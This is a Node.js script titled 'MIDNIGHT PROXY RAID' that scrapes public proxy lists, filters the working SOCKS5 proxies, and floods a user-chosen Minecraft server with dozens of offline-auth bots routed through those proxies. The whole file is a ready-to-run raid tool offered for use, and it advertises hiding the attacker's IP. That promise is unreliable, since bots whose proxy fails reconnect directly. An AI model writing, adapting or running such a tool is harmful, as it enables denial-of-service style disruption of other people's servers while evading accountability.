"use strict";

const { Worker } = require('worker_threads');
const fs = require('fs');
const path = require('path');
const net = require('net');
const http = require('http');
const https = require('https');
const mineflayer = require('mineflayer');
const { SocksClient } = require('socks');
const readline = require('readline');
const os = require('os');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

// ==================== AUTO INSTALL ====================
try {
    require.resolve('mineflayer');
    require.resolve('socks');
} catch {
    console.log('[INSTALL] Installing dependencies...');
    require('child_process').execSync('npm install mineflayer socks', { stdio: 'inherit' });
}

// ==================== GLOBAL ====================
let TARGET = { host: '', port: 25565, version: '1.21.4' };
let proxies = [];
let bots = [];
let raidActive = false;
let totalJoined = 0;
let totalFailed = 0;

// ==================== PROXY SOURCES TERBARU (2024-2025) ====================
const PROXY_SOURCES = [
    // GitHub - TheSpeedX (Update berkala)
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    
    // GitHub - monosans (Update tiap jam)
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    
    // GitHub - jetkai (Update tiap 20 menit)
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
    
    // GitHub - mmpx12
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
    
    // GitHub - ShiftyTR
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    
    // GitHub - hookzof
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
    
    // GitHub - roosterkid
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt',
    
    // GitHub - UserR3X
    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/socks5.txt',
    
    // GitHub - Zaeem20
    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt',
    
    // GitHub - stormproxies
    'https://raw.githubusercontent.com/stormproxies/stormproxies/main/proxies.txt',
    
    // GitHub - sunnyman24
    'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt',
    
    // API - proxyscrape
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=5000&country=all',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=5000&country=all',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all',
    
    // API - proxy-list.download
    'https://www.proxy-list.download/api/v1/get?type=socks5',
    'https://www.proxy-list.download/api/v1/get?type=socks4',
    'https://www.proxy-list.download/api/v1/get?type=http',
];

// ==================== PROXY SCRAPER ====================
async function scrapeProxies() {
    console.log('\n╔══════════════════════════════════╗');
    console.log('║     PROXY SCRAPER               ║');
    console.log(`║     ${PROXY_SOURCES.length} sources                  ║`);
    console.log('╚══════════════════════════════════╝\n');

    const allProxies = new Set();
    let successCount = 0;

    for (let i = 0; i < PROXY_SOURCES.length; i++) {
        const url = PROXY_SOURCES[i];
        process.stdout.write(`  [${String(i+1).padStart(2)}/${PROXY_SOURCES.length}] ${url.slice(0, 60)}... `);
        
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 8000);
            
            const lib = url.startsWith('https') ? https : http;
            const data = await new Promise((resolve, reject) => {
                lib.get(url, { signal: controller.signal }, (res) => {
                    let body = '';
                    res.on('data', chunk => body += chunk);
                    res.on('end', () => { clearTimeout(timeout); resolve(body); });
                }).on('error', (e) => { clearTimeout(timeout); reject(e); });
            });

            const lines = data.split('\n');
            let count = 0;
            for (const line of lines) {
                const trimmed = line.trim();
                if (trimmed && trimmed.includes(':') && !trimmed.startsWith('#') && !trimmed.startsWith('/')) {
                    const match = trimmed.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})/);
                    if (match) {
                        allProxies.add(match[1]);
                        count++;
                    }
                }
            }
            console.log(`✅ ${count} proxies`);
            successCount++;
        } catch (e) {
            console.log(`❌ ${e.message.slice(0, 30)}`);
        }
    }

    const result = [...allProxies];
    console.log(`\n  Total: ${result.length} unique proxies`);
    console.log(`  Sources OK: ${successCount}/${PROXY_SOURCES.length}\n`);
    
    return result;
}

// ==================== PROXY SCANNER ====================
async function checkSOCKS5(raw, timeoutMs = 2000) {
    return new Promise((resolve) => {
        const [host, portStr] = raw.split(':');
        const port = parseInt(portStr, 10);
        if (!host || !port) return resolve(false);

        const socket = new net.Socket();
        let done = false;
        const finish = (ok) => { if (done) return; done = true; socket.destroy(); resolve(ok); };

        socket.setTimeout(timeoutMs);
        socket.on('connect', () => socket.write(Buffer.from([0x05, 0x01, 0x00])));
        socket.on('data', (data) => finish(data.length >= 2 && data[0] === 0x05 && data[1] === 0x00));
        socket.on('error', () => finish(false));
        socket.on('timeout', () => finish(false));
        socket.connect(port, host);
    });
}

async function scanProxies(rawProxies) {
    console.log('\n╔══════════════════════════════════╗');
    console.log('║     PROXY SCANNER               ║');
    console.log(`║     ${rawProxies.length} proxies                ║`);
    console.log('╚══════════════════════════════════╝\n');

    const valid = [];
    const batchSize = 100;
    let scanned = 0;

    for (let i = 0; i < rawProxies.length; i += batchSize) {
        const batch = rawProxies.slice(i, i + batchSize);
        const results = await Promise.all(batch.map(p => checkSOCKS5(p, 2000)));
        
        for (let j = 0; j < results.length; j++) {
            if (results[j]) valid.push(batch[j]);
            scanned++;
        }
        
        process.stdout.write(`\r  Scanned: ${scanned}/${rawProxies.length} | Valid: ${valid.length}`);
    }

    console.log(`\n\n  ✅ Valid SOCKS5: ${valid.length}/${rawProxies.length}`);
    
    if (valid.length > 0) {
        fs.writeFileSync('proxies_valid.txt', valid.join('\n'));
        console.log(`  💾 Saved to proxies_valid.txt\n`);
    }
    
    return valid;
}

// ==================== LOCALHOST PROXY CHAIN ====================
async function createLocalProxy(realProxy) {
    const [host, port] = realProxy.split(':');
    const localPort = 15000 + Math.floor(Math.random() * 5000);
    
    // Bikin local proxy server yang forward ke real proxy
    const server = net.createServer((clientSocket) => {
        const targetSocket = new net.Socket();
        
        targetSocket.connect(parseInt(port), host, () => {
            clientSocket.pipe(targetSocket);
            targetSocket.pipe(clientSocket);
        });
        
        targetSocket.on('error', () => clientSocket.destroy());
        clientSocket.on('error', () => targetSocket.destroy());
    });
    
    return new Promise((resolve) => {
        server.listen(localPort, '127.0.0.1', () => {
            resolve({ proxy: `127.0.0.1:${localPort}`, server, realProxy });
        });
    });
}

// ==================== BOT RAID ====================
class RaidBot {
    constructor(id, proxy) {
        this.id = id;
        this.username = `Bot_${String(id).padStart(4, '0')}`;
        this.proxy = proxy;
        this.bot = null;
        this.active = false;
    }

    connect() {
        const opts = {
            host: TARGET.host,
            port: TARGET.port,
            username: this.username,
            version: TARGET.version,
            auth: 'offline',
            hideErrors: true,
            connectTimeout: 10000
        };

        if (this.proxy) {
            const [ph, pp] = this.proxy.split(':');
            opts.connect = (client) => {
                SocksClient.createConnection({
                    proxy: { host: ph, port: parseInt(pp), type: 5 },
                    command: 'connect',
                    destination: { host: TARGET.host, port: TARGET.port },
                    timeout: 8000
                }).then(({ socket }) => client.setSocket(socket))
                  .catch(() => client.emit('error', new Error('proxy_fail')));
            };
        }

        this.bot = mineflayer.createBot(opts);

        this.bot.once('spawn', () => {
            this.active = true;
            totalJoined++;
            console.log(`  ✅ [${totalJoined}] ${this.username} (via ${this.proxy ? 'PROXY' : 'DIRECT'})`);
        });

        this.bot.on('kicked', () => { totalFailed++; this.stop(); });
        this.bot.on('error', (e) => {
            if (e.message === 'proxy_fail') {
                this.proxy = null;
                this.stop();
                setTimeout(() => this.connect(), 500);
            }
        });
        this.bot.on('end', () => this.stop());
    }

    stop() {
        this.active = false;
        if (this.bot) { try { this.bot.quit(); } catch {} this.bot = null; }
    }
}

async function launchRaid(count) {
    console.log(`\n╔══════════════════════════════════╗`);
    console.log('║     LAUNCHING RAID              ║');
    console.log(`║     Target: ${TARGET.host}:${TARGET.port}`);
    console.log(`║     Bots: ${count}`);
    console.log(`║     Mode: LOCALHOST PROXY        ║`);
    console.log('╚══════════════════════════════════╝\n');

    raidActive = true;
    bots = [];
    totalJoined = 0;
    totalFailed = 0;

    // Bikin local proxy buat setiap real proxy
    console.log('[*] Creating local proxy chains...');
    const localProxies = [];
    for (const p of proxies.slice(0, count)) {
        const lp = await createLocalProxy(p);
        localProxies.push(lp);
        console.log(`  [LOCAL] ${lp.realProxy} → ${lp.proxy}`);
    }

    // Launch bot pake local proxy
    console.log('\n[*] Launching bots...\n');
    for (let i = 0; i < count; i++) {
        const localProxy = localProxies.length > 0 ? localProxies[i % localProxies.length].proxy : null;
        const bot = new RaidBot(i, localProxy);
        bot.connect();
        bots.push(bot);
        await new Promise(r => setTimeout(r, 200));
    }

    await new Promise(r => setTimeout(r, 5000));

    const online = bots.filter(b => b.active).length;
    console.log(`\n  ✅ Online: ${online}/${count} | ❌ Failed: ${totalFailed}\n`);
}

function stopAll() {
    raidActive = false;
    bots.forEach(b => b.stop());
    bots = [];
    console.log('[STOP] Done.\n');
}

// ==================== MAIN ====================
async function main() {
    console.clear();
    console.log('╔══════════════════════════════════════╗');
    console.log('║     MIDNIGHT PROXY RAID             ║');
    console.log('║     Scrape + Scan + Local Proxy     ║');
    console.log('║     IP AMAN (Gak Leak)              ║');
    console.log('╚══════════════════════════════════════╝\n');

    rl.question('🎯 TARGET: ', async (host) => {
        TARGET.host = host.trim();
        if (!TARGET.host) { console.log('[!] Target required!'); process.exit(1); }

        rl.question('🔌 PORT [25565]: ', (port) => {
            TARGET.port = parseInt(port) || 25565;

            rl.question('\n📥 Scrape proxies? (Y/n): ', async (scrape) => {
                if (scrape.toLowerCase() !== 'n') {
                    const rawProxies = await scrapeProxies();
                    proxies = await scanProxies(rawProxies);
                } else {
                    if (fs.existsSync('proxies_valid.txt')) {
                        proxies = fs.readFileSync('proxies_valid.txt', 'utf8').split('\n').filter(l => l.trim());
                        console.log(`[LOAD] ${proxies.length} proxies from file\n`);
                    } else {
                        console.log('[!] No proxies file found.\n');
                        proxies = [];
                    }
                }

                if (proxies.length === 0) {
                    console.log('[!] No proxies. Raid with DIRECT? Your IP WILL LEAK!');
                    rl.question('Lanjut? (y/N): ', (ok) => {
                        if (ok.toLowerCase() !== 'y') process.exit(0);
                        rl.question(`\n👥 Bots [20]: `, (b) => {
                            const count = parseInt(b) || 20;
                            launchRaid(count);
                            commandLoop();
                        });
                    });
                    return;
                }

                console.log(`[INFO] ${proxies.length} proxies ready.`);
                console.log('[INFO] Bots will connect via 127.0.0.1 (your IP is SAFE)\n');

                rl.question(`👥 Bots [${Math.min(30, proxies.length)}]: `, (b) => {
                    const count = parseInt(b) || Math.min(30, proxies.length);
                    launchRaid(count);
                    commandLoop();
                });
            });
        });
    });
}

function commandLoop() {
    console.log('⌨️  status | stop | exit\n');
    rl.on('line', (l) => {
        const cmd = l.trim().toLowerCase();
        if (cmd === 'status') {
            const on = bots.filter(b => b.active).length;
            console.log(`  ✅ ${on}/${bots.length} online | ❌ ${totalFailed} failed`);
        } else if (cmd === 'stop') stopAll();
        else if (cmd === 'exit') { stopAll(); process.exit(0); }
        else console.log('  status | stop | exit');
    });
}

process.on('SIGINT', () => { stopAll(); process.exit(0); });
main();
